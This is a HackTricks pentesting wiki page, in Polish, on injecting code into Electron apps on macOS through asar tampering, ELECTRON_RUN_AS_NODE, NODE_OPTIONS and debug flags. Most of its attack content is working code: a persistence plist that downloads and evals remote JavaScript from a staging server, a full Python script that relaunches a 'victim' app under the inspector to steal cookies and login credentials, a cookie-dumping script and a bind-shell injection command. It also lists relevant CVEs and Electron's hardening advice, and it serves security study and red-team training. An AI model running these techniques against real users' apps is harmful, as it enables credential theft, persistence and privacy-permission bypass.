# Wstrzykiwanie do aplikacji Electron w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Jeśli nie wiesz, czym jest Electron, możesz znaleźć [**wiele informacji tutaj**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Na razie wystarczy wiedzieć, że Electron uruchamia **node**.\
A node ma kilka **parametrów** i **zmiennych środowiskowych**, których można użyć, aby **wykonywał inny kod** poza wskazanym plikiem.

### Electron Fuses

Techniki te zostaną omówione dalej, ale w ostatnim czasie Electron dodał kilka **flag bezpieczeństwa zapobiegających ich wykorzystaniu**. Są to [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), a poniższe służą do **uniemożliwiania** aplikacjom Electron w macOS **ładowania dowolnego kodu**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Jeśli jest wyłączona, uniemożliwia użycie env var **`ELECTRON_RUN_AS_NODE`** do inject code.
- **`EnableNodeCliInspectArguments`**: Jeśli jest wyłączona, parametry takie jak `--inspect` i `--inspect-brk` nie będą uwzględniane. Zapobiega to inject code tą metodą.
- **`EnableEmbeddedAsarIntegrityValidation`**: Jeśli jest włączona, załadowany **plik** **`asar`** zostanie **zweryfikowany** przez macOS. W ten sposób **zapobiega** się **code injection** poprzez modyfikację zawartości tego pliku.
- **`OnlyLoadAppFromAsar`**: Jeśli jest włączona, zamiast wyszukiwać pliku do załadowania w następującej kolejności: **`app.asar`**, **`app`**, a na końcu **`default_app.asar`**, sprawdzi i użyje wyłącznie `app.asar`, zapewniając tym samym, że po **połączeniu** z fuse **`embeddedAsarIntegrityValidation`** **niemożliwe** będzie **załadowanie niezweryfikowanego kodu**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Jeśli jest włączona, proces przeglądarki używa pliku o nazwie `browser_v8_context_snapshot.bin` jako snapshotu V8.

Innym interesującym fuse, który nie zapobiega code injection, jest:

- **EnableCookieEncryption**: Jeśli jest włączona, magazyn cookies na dysku jest szyfrowany przy użyciu kluczy kryptograficznych na poziomie systemu operacyjnego.

### Sprawdzanie Electron Fuses

Możesz **sprawdzić te flagi** z poziomu aplikacji za pomocą:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modyfikowanie Electron Fuses

Jak [**wspomniano w dokumentacji**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracja **Electron Fuses** znajduje się wewnątrz **Electron binary**, które zawiera gdzieś ciąg **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

W aplikacjach macOS znajduje się on zazwyczaj w `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Możesz załadować ten plik w [https://hexed.it/](https://hexed.it/) i wyszukać poprzedni string. Po tym stringu możesz zobaczyć w ASCII liczbę „0” lub „1” wskazującą, czy każdy fuse jest wyłączony, czy włączony. Wystarczy zmodyfikować kod hex (`0x30` to `0`, a `0x31` to `1`), aby **zmodyfikować wartości fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Pamiętaj, że jeśli spróbujesz **nadpisać** binarny plik **`Electron Framework`** wewnątrz aplikacji po zmodyfikowaniu tych bajtów, aplikacja nie uruchomi się.

## RCE - dodawanie kodu do aplikacji Electron

Aplikacja Electron może używać **zewnętrznych plików JS/HTML**, więc attacker może wstrzyknąć kod do tych plików, których sygnatura nie będzie sprawdzana, i wykonać dowolny kod w kontekście aplikacji.

> [!CAUTION]
> Jednak obecnie istnieją 2 ograniczenia:
>
> - Uprawnienie **`kTCCServiceSystemPolicyAppBundles`** jest **wymagane**, aby zmodyfikować aplikację, więc domyślnie nie jest to już możliwe.
> - Skompilowany plik **`asap`** zwykle ma włączone fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`**
>
> To sprawia, że ta ścieżka ataku jest bardziej skomplikowana (lub niemożliwa).

Pamiętaj, że można ominąć wymaganie **`kTCCServiceSystemPolicyAppBundles`**, kopiując aplikację do innego katalogu (np. **`/tmp`**), zmieniając nazwę folderu **`app.app/Contents`** na **`app.app/NotCon`**, **modyfikując** plik **asar** za pomocą swojego **malicious** kodu, przywracając nazwę **`app.app/Contents`** i uruchamiając aplikację.

Możesz rozpakować kod z pliku asar za pomocą:
```bash
npx asar extract app.asar app-decomp
```
I spakuj ją ponownie po zmodyfikowaniu jej za pomocą:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE z ELECTRON_RUN_AS_NODE

Zgodnie z [**dokumentacją**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), jeśli ta zmienna środowiskowa jest ustawiona, proces zostanie uruchomiony jako zwykły proces Node.js.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Jeśli fuse **`RunAsNode`** jest wyłączony, zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** zostanie zignorowana i to nie zadziała.

### Injection z pliku Plist aplikacji

Jak [**zaproponowano tutaj**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), możesz nadużyć tej zmiennej środowiskowej w pliku plist, aby utrzymać persistence:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE z `NODE_OPTIONS`

Możesz przechowywać payload w innym pliku i go wykonać:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Jeśli fuse **`EnableNodeOptionsEnvironmentVariable`** jest **disabled**, aplikacja będzie **ignore** env var **NODE_OPTIONS** po uruchomieniu, chyba że zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** jest ustawiona. Ona również będzie **ignored**, jeśli fuse **`RunAsNode`** jest **disabled**.
>
> Jeśli nie ustawisz **`ELECTRON_RUN_AS_NODE`**, zobaczysz **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection from the App Plist

Możesz abuse'ować tę zmienną środowiskową w pliku plist, aby utrzymać persistence, dodając te klucze:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE z inspekcją

Zgodnie z [**tym**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), jeśli uruchomisz aplikację Electron z flagami takimi jak **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **port debugowania będzie otwarty**, więc możesz się z nim połączyć (na przykład z Chrome pod adresem `chrome://inspect`) i będziesz mieć możliwość **wstrzykiwania do niego kodu** lub nawet uruchamiania nowych procesów.<sup>[[7]](#references)</sup>\
Na przykład:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
W [**tym wpisie na blogu**](https://hackerone.com/reports/1274695) wykorzystano to debugowanie do tego, aby headless chrome **pobierał dowolne pliki do dowolnych lokalizacji**.<sup>[[8]](#references)</sup>

> [!TIP]
> Jeśli aplikacja ma własny sposób sprawdzania, czy zmienne środowiskowe lub parametry, takie jak `--inspect`, są ustawione, możesz spróbować **ominąć** to w runtime za pomocą argumentu `--inspect-brk`, który **zatrzyma wykonywanie** na początku działania aplikacji i umożliwi wykonanie obejścia (na przykład przez nadpisanie argumentów lub zmiennych środowiskowych bieżącego procesu).

Poniższy exploit polegał na tym, że monitorowanie i uruchomienie aplikacji z parametrem `--inspect-brk` umożliwiało ominięcie niestandardowej ochrony, którą posiadała (przez nadpisanie parametrów procesu w celu usunięcia `--inspect-brk`), a następnie wstrzyknięcie payloadu JS w celu zrzucenia cookies i danych uwierzytelniających z aplikacji:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Jeśli fuse **`EnableNodeCliInspectArguments`** jest wyłączony, aplikacja będzie **ignorować parametry node** (takie jak `--inspect`) podczas uruchamiania, chyba że ustawiona zostanie zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`**, która również będzie **ignorowana**, jeśli fuse **`RunAsNode`** jest wyłączony.
>
> Nadal można jednak użyć **parametru electron `--remote-debugging-port=9229`**, ale poprzedni payload nie zadziała do uruchamiania innych procesów.

Używając parametru **`--remote-debugging-port=9222`**, można wykraść pewne informacje z Electron App, takie jak **historia** (za pomocą poleceń GET) lub **cookies** przeglądarki (ponieważ są one **odszyfrowane** wewnątrz przeglądarki i istnieje **endpoint json**, który je zwraca).

Dowiedz się, jak to zrobić, korzystając z [**tego**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**tego**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), oraz użyj automatycznego narzędzia [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) lub prostego skryptu, takiego jak:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Możesz nadużyć tej zmiennej środowiskowej w pliku plist, aby utrzymać persistence, dodając następujące klucze:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass z wykorzystaniem starszych wersji

> [!TIP]
> Demon TCC w macOS nie sprawdza wersji uruchamianej aplikacji. Jeśli więc **nie możesz wstrzyknąć code do aplikacji Electron** za pomocą którejkolwiek z wcześniejszych technik, możesz pobrać wcześniejszą wersję APP i wstrzyknąć do niej code, ponieważ nadal uzyska uprawnienia TCC (chyba że uniemożliwi to Trust Cache).

## Uruchamianie code innego niż JS

Wcześniejsze techniki pozwolą uruchomić **JS code wewnątrz procesu aplikacji electron**. Należy jednak pamiętać, że **procesy potomne działają w ramach tego samego profilu sandbox** co aplikacja nadrzędna i **dziedziczą jej uprawnienia TCC**.\
Jeśli więc chcesz nadużyć entitlements, aby na przykład uzyskać dostęp do kamery lub mikrofonu, możesz po prostu **uruchomić inny binary z poziomu procesu**.

## Istotne vulnerabilities Electron macOS (2023-2024)

### CVE-2023-44402 – obejście integralności ASAR

Electron ≤22.3.23 oraz różne wersje pre-release 23-27 pozwalały attackerowi z dostępem do zapisu folderu `.app/Contents/Resources` obejść fuses `embeddedAsarIntegrityValidation` **i** `onlyLoadAppFromAsar`. Błąd wynikał z *file-type confusion* w checkerze integralności, który pozwalał załadować spreparowany **katalog o nazwie `app.asar`** zamiast zweryfikowanego archive, dzięki czemu dowolny JavaScript umieszczony w tym katalogu był wykonywany podczas uruchamiania aplikacji. W związku z tym nawet vendors, którzy zastosowali się do hardening guidance i włączyli oba fuses, nadal byli vulnerable w macOS.<sup>[[3]](#references)</sup>

Patched versions Electron: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** oraz **27.0.0-alpha.7**. Attackers, którzy znajdą aplikację działającą na starszym buildzie, mogą nadpisać `Contents/Resources/app.asar` własnym katalogiem, aby wykonać code z uprawnieniami TCC aplikacji.<sup>[[3]](#references)</sup>

### Klaster CVE „RunAsNode” / „enableNodeCliInspectArguments” z 2024 roku

W styczniu 2024 roku seria CVE (CVE-2024-23738 do CVE-2024-23743) zwróciła uwagę na fakt, że wiele aplikacji Electron jest dostarczanych z nadal włączonymi fuses **RunAsNode** i **EnableNodeCliInspectArguments**. Lokalny attacker może więc ponownie uruchomić program ze zmienną środowiskową `ELECTRON_RUN_AS_NODE=1` lub flagami takimi jak `--inspect-brk`, aby przekształcić go w *generic* process Node.js i odziedziczyć cały sandbox oraz uprawnienia TCC aplikacji.<sup>[[4]](#references)</sup>

Chociaż zespół Electron zakwestionował ocenę „critical” i zauważył, że attacker i tak potrzebuje local code–execution, problem nadal jest wartościowy podczas post-exploitation, ponieważ przekształca dowolny vulnerable Electron bundle w binary typu *living-off-the-land*, który może na przykład odczytywać Contacts, Photos lub inne wrażliwe zasoby, do których aplikacja desktopowa otrzymała wcześniej dostęp.<sup>[[4]](#references)</sup>

Defensive guidance od maintainers Electron:<sup>[[4]](#references)</sup>

* Wyłącz fuses `RunAsNode` i `EnableNodeCliInspectArguments` w production builds.
* Użyj nowszego API **UtilityProcess**, jeśli aplikacja rzeczywiście potrzebuje pomocniczego procesu Node.js, zamiast ponownie włączać te fuses.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) może być łatwo użyty do **znajdowania vulnerable aplikacji electron** zainstalowanych w systemie i wstrzykiwania do nich code. Tool próbuje użyć techniki **`--inspect`**:

Musisz samodzielnie go skompilować i możesz używać go w następujący sposób:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki został zaprojektowany do backdoorowania aplikacji Electron poprzez zastępowanie plików JavaScript aplikacji plikami JavaScript Loki Command & Control.


## Odnośniki

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [MacOS Injection via Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR Integrity bypass via filetype confusion (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Statement regarding 'runAsNode' CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - A New Weapon in Your Red Teaming Armory - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Why Electron apps can't store your secrets confidentially: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging abused to download arbitrary files](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
